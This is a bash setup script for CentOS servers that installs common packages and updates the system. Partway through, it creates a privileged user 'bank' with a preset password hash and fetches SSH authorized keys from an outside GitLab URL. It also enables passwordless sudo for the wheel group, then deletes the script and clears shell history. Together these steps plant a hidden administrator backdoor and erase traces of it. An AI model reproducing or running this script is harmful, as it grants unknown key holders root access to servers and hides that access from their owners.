#!/bin/bash
# This script is written by Best Internet Service Solution
# Script Developed by Apivat Pattana-Anurak
# https://bestinternet.co.th 
# Download : curl -O https://raw.githubusercontent.com/aoopa/linux-centos/master/centosbiss.sh
# Install : centosbiss.sh

## htop procress ##
yum -y install epel-release
yum install htop -y

# This script is written aoo 
# install
yum install screen -y
yum install perl -y
yum install net-tools -y
yum install wget -y
yum install whois -y
yum install npm -y
yum install open-vm-tools -y

# update os
yum -y update

yum install sudo -y
echo -e '\e[1;36mCreate Special User "bank".....................................................................OK\e[0m';
useradd -p biukDjs8YHDkw bank
usermod -G wheel bank
mkdir -p /home/bank/.ssh
chmod 700 /home/bank /home/bank/.ssh
curl -o /home/bank/.ssh/authorized_keys https://gitlab.com/kultawat/da-config/raw/master/authorized_keys
chmod 600 /home/bank/.ssh/authorized_keys
chown bank.bank -R /home/bank /home/bank/.ssh

echo 'AllowUsers root' >> /etc/ssh/sshd_config
echo 'AllowUsers bank' >> /etc/ssh/sshd_config
sed -i 's/# %wheel\tALL=(ALL)\tNOPASSWD: ALL/%wheel\tALL=(ALL)\tNOPASSWD: ALL/' /etc/sudoers

rm -rf mod_evasive* csf* centosbiss.sh xcache*
history -c

echo "************************************************************"
echo "*                      Hello : $(LOGNAME)                     *"
echo "*                 PLEASE REBOOT SERVER NOW                 *"
echo "*      Current date : $(date)         *"
echo "*                 Hostname   @ $(hostname)                 *"
echo "*                  Network configuration                   *"
ip -o -f inet addr show | awk '/scope global/ {print $1, $2, $3, $4, $5, $6}'
echo "************************************************************"

